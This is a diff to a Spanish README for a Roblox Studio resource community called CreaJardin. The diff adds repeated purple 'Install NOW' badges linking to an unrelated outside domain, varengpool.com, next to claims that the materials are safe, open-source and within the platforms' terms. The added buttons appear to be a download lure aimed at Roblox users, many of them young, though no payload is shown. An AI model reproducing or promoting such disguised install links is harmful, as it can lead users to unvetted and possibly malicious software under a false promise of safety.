@@ -4,6 +4,15 @@
 
 ![Visitantes: 22K+](https://img.shields.io/badge/Visitantes-22K+-ff9f43) ![Actualizado: Septiembre 2025](https://img.shields.io/badge/Actualizado-Septiembre_2025-3498db)  
 
+
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
+-
+
+
+
+[![Explorar](https://img.shields.io/badge/Explorar-AHORA-blueviolet)](https://github.com/CreaJardins/RobloxJuego)  
+-
+
 **🌟 ¡Bienvenidos, Creadores!**  
 **CreaJardin** es una comunidad dinámica de 2025 que impulsa la creatividad a través de recursos gratuitos para diseñar mundos en Roblox Studio. 🎲 Nuestros materiales son seguros, de código abierto y cumplen con los Términos de Servicio de GitHub y Roblox. ¡Únete a más de 22K soñadores para crear sin límites! 🚀  
 
@@ -24,6 +33,10 @@ Encender la chispa creativa en principiantes, ofreciendo recursos educativos par
 - Explora nuestro proyecto **RobloxJuego** para descargar recursos. 📥  
 - Propón ideas abriendo un *issue* en nuestro repositorio. 💬  
 - ¡Conecta con nuestra comunidad y comienza a crear! 🎉  
+
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
+-
+
 
 **📩 Contacto**  
 ¿Preguntas? Abre un *issue* en **RobloxJuego** y te ayudaremos pronto. 🌟  
